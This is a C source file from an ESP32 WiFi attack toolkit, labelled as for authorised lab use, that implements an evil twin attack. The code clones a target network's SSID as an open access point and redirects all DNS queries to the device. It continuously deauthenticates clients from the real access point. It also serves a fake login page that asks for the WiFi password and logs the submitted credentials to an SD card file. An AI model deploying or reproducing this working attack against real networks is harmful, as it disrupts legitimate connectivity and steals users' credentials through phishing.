/*
 * ChL-CyberKit v1.0 PRO — ESP32 WiFi/BLE Security Auditing Framework
 * Copyright (C) 2026  ChL (Pedro Reza) <pedrorezabala26@gmail.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
/**
 * @file evil_twin.c
 * @brief Implementación del módulo Evil Twin.
 *        SOLO PARA USO EN LABORATORIO AUTORIZADO.
 *
 * @author Pedro Luis Rezabala — ChL-CyberKit v1.0 PRO
 */
#include "evil_twin.h"
#include "wifi_controller.h"
#include "attack_method.h"
#include "sd_storage.h"

#include <string.h>
#include <stdio.h>
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"

static const char *TAG = "evil_twin";

/* ── Estado interno ─────────────────────────────────────────────────────── */
static evil_twin_state_t g_state      = ET_IDLE;
static uint8_t           g_cred_count = 0;
static evil_twin_cfg_t   g_cfg;
static TaskHandle_t      g_dns_task   = NULL;

/* ── Portal HTML (mínimo, funcional) ────────────────────────────────────── */
static const char PORTAL_HTML[] =
    "<!DOCTYPE html><html lang='es'><head>"
    "<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Iniciar sesión</title>"
    "<style>"
    "body{font-family:Arial,sans-serif;background:#f0f0f0;display:flex;"
    "justify-content:center;align-items:center;height:100vh;margin:0}"
    ".box{background:#fff;padding:32px;border-radius:8px;box-shadow:0 2px 12px #0002;"
    "width:320px;text-align:center}"
    "h2{margin-bottom:24px;color:#1a73e8}"
    "input{width:100%;padding:10px;margin:8px 0;box-sizing:border-box;"
    "border:1px solid #ccc;border-radius:4px;font-size:14px}"
    "button{width:100%;padding:12px;background:#1a73e8;color:#fff;"
    "border:none;border-radius:4px;font-size:16px;cursor:pointer;margin-top:8px}"
    "p{color:#666;font-size:12px}"
    "</style></head><body>"
    "<div class='box'>"
    "<h2>WiFi — Autenticación</h2>"
    "<p>Para acceder a Internet ingrese su contraseña WiFi.</p>"
    "<form action='/portal/submit' method='POST'>"
    "<input type='text'     name='user' placeholder='Usuario (opcional)'>"
    "<input type='password' name='pass' placeholder='Contraseña WiFi' required>"
    "<button type='submit'>Conectar</button>"
    "</form>"
    "<p style='margin-top:16px;color:#bbb'>ChL-CyberKit Network Auth</p>"
    "</div></body></html>";

static const char PORTAL_OK_HTML[] =
    "<!DOCTYPE html><html lang='es'><head><meta charset='UTF-8'>"
    "<meta http-equiv='refresh' content='3;url=http://www.google.com'>"
    "<title>Conectado</title></head><body style='font-family:Arial;text-align:center;padding-top:80px'>"
    "<h2 style='color:#2e7d32'>&#10003; Autenticación exitosa</h2>"
    "<p>Redirigiendo…</p></body></html>";

/* ── DNS Captive Portal Task ─────────────────────────────────────────────── */
/* Responde TODAS las consultas DNS con 10.10.10.26 (IP del AP de gestión).  */
static void dns_captive_task(void *arg) {
    (void)arg;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        ESP_LOGE(TAG, "DNS: no se pudo crear socket");
        vTaskDelete(NULL);
        return;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port        = htons(53);

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        ESP_LOGE(TAG, "DNS: bind puerto 53 falló (¿se necesitan privilegios?)");
        close(sock);
        vTaskDelete(NULL);
        return;
    }

    ESP_LOGI(TAG, "DNS captive escuchando en :53");

    uint8_t buf[512];
    struct sockaddr_in client;
    socklen_t clen = sizeof(client);

    while (g_state == ET_RUNNING) {
        int n = recvfrom(sock, buf, sizeof(buf), 0,
                         (struct sockaddr *)&client, &clen);
        if (n < 12) continue;

        /* Construir respuesta DNS tipo A con IP 10.10.10.26 */
        uint8_t resp[512];
        memcpy(resp, buf, (size_t)n);

        /* Flags: QR=1, Opcode=0, AA=1, TC=0, RD=1, RA=1, RCODE=0 */
        resp[2] = 0x85;
        resp[3] = 0x80;

        /* Answer count = 1 */
        resp[6] = 0x00;
        resp[7] = 0x01;

        int resp_len = n;

        /* Añadir Answer RR */
        if (resp_len + 16 < (int)sizeof(resp)) {
            resp[resp_len++] = 0xC0;  /* nombre comprimido → offset 12 */
            resp[resp_len++] = 0x0C;
            resp[resp_len++] = 0x00; resp[resp_len++] = 0x01;  /* Type A    */
            resp[resp_len++] = 0x00; resp[resp_len++] = 0x01;  /* Class IN  */
            resp[resp_len++] = 0x00; resp[resp_len++] = 0x00;
            resp[resp_len++] = 0x00; resp[resp_len++] = 0x3C;  /* TTL 60s   */
            resp[resp_len++] = 0x00; resp[resp_len++] = 0x04;  /* RDLENGTH  */
            resp[resp_len++] = 10;                              /* 10.       */
            resp[resp_len++] = 10;                              /* .10.      */
            resp[resp_len++] = 10;                              /* ..10.     */
            resp[resp_len++] = 26;                              /* ...26     */
        }

        sendto(sock, resp, (size_t)resp_len, 0,
               (struct sockaddr *)&client, clen);
    }

    close(sock);
    ESP_LOGI(TAG, "DNS captive detenido");
    vTaskDelete(NULL);
}

/* ── evil_twin_start() ──────────────────────────────────────────────────── */
bool evil_twin_start(const evil_twin_cfg_t *cfg) {
    if (g_state != ET_IDLE) {
        ESP_LOGW(TAG, "Evil Twin ya activo");
        return false;
    }

    memcpy(&g_cfg, cfg, sizeof(evil_twin_cfg_t));
    g_cred_count = 0;
    g_state = ET_RUNNING;

    /* 1. Detener AP de gestión */
    wifictl_ap_stop();

    /* 2. Levantar AP falso con el mismo SSID, red OPEN */
    wifi_config_t ap_cfg;
    memset(&ap_cfg, 0, sizeof(ap_cfg));
    strncpy((char *)ap_cfg.ap.ssid, cfg->ssid, 32);
    ap_cfg.ap.ssid_len     = (uint8_t)strlen(cfg->ssid);
    ap_cfg.ap.channel      = cfg->channel;
    ap_cfg.ap.authmode     = WIFI_AUTH_OPEN;
    ap_cfg.ap.max_connection = 8;
    ap_cfg.ap.beacon_interval = 100;

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_cfg));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_LOGI(TAG, "AP falso: SSID='%s' ch=%d", cfg->ssid, cfg->channel);

    /* 3. Iniciar DNS captive en tarea separada */
    xTaskCreate(dns_captive_task, "et_dns", 4096, NULL, 5, &g_dns_task);

    /* 4. Deauth continuo al AP real (broadcast) —
     *    attack_method_broadcast() espera un wifi_ap_record_t*, así que
     *    construimos uno temporal con los campos mínimos necesarios.      */
    {
        wifi_ap_record_t tmp_ap;
        memset(&tmp_ap, 0, sizeof(tmp_ap));
        memcpy(tmp_ap.bssid, cfg->bssid, 6);
        strncpy((char *)tmp_ap.ssid, cfg->ssid, 32);
        tmp_ap.primary = cfg->channel;
        /* timeout 0 → la función usa su propio loop infinito detenido
         * con attack_method_broadcast_stop()                           */
        attack_method_broadcast(&tmp_ap, 0);
    }

    ESP_LOGI(TAG, "Evil Twin ACTIVO — capturando creds en /CyberKit/captures/creds.csv");
    return true;
}

/* ── evil_twin_stop() ────────────────────────────────────────────────────── */
void evil_twin_stop(void) {
    if (g_state == ET_IDLE) return;
    g_state = ET_STOPPING;

    /* Detener deauth */
    attack_method_broadcast_stop();

    /* La task DNS saldrá sola al ver g_state != ET_RUNNING */
    g_dns_task = NULL;

    /* Apagar AP falso */
    esp_wifi_stop();

    /* Restaurar AP de gestión */
    wifictl_mgmt_ap_start();

    g_state = ET_IDLE;
    ESP_LOGI(TAG, "Evil Twin DETENIDO. Creds capturadas: %d", (int)g_cred_count);
}

/* ── Getters ─────────────────────────────────────────────────────────────── */
evil_twin_state_t evil_twin_get_state(void) { return g_state; }
uint8_t           evil_twin_cred_count(void) { return g_cred_count; }

/* ── Handler HTTP del portal ─────────────────────────────────────────────── */
int evil_twin_handle_http(const char *req_uri, const char *body,
                           char *resp_buf, int buf_size) {
    if (!req_uri || !resp_buf || buf_size <= 0) return 0;

    /* GET /portal → servir formulario */
    if (strncmp(req_uri, "/portal/submit", 14) != 0) {
        int len = (int)strlen(PORTAL_HTML);
        if (len >= buf_size) len = buf_size - 1;
        memcpy(resp_buf, PORTAL_HTML, (size_t)len);
        resp_buf[len] = '\0';
        return len;
    }

    /* POST /portal/submit → extraer user= y pass= */
    char user_val[64] = {0};
    char pass_val[64] = {0};

    if (body) {
        /* Extraer campo 'user' */
        const char *p = strstr(body, "user=");
        if (p) {
            p += 5;
            int i = 0;
            while (*p && *p != '&' && i < 63) user_val[i++] = *p++;
        }
        /* Extraer campo 'pass' */
        p = strstr(body, "pass=");
        if (p) {
            p += 5;
            int i = 0;
            while (*p && *p != '&' && i < 63) pass_val[i++] = *p++;
        }
    }

    /* Guardar en SD si hay contraseña */
    if (pass_val[0] != '\0') {
        char csv_line[256];
        snprintf(csv_line, sizeof(csv_line),
                 "CRED,\"%s\",\"%s\",\"%s\"",
                 g_cfg.ssid, user_val, pass_val);
        sd_append_line("/CyberKit/captures/creds.csv", csv_line);
        g_cred_count++;
        ESP_LOGI(TAG, "CRED capturada #%d: ssid=%s user=%s",
                 (int)g_cred_count, g_cfg.ssid, user_val);
    }

    /* Responder OK */
    int len = (int)strlen(PORTAL_OK_HTML);
    if (len >= buf_size) len = buf_size - 1;
    memcpy(resp_buf, PORTAL_OK_HTML, (size_t)len);
    resp_buf[len] = '\0';
    return len;
}
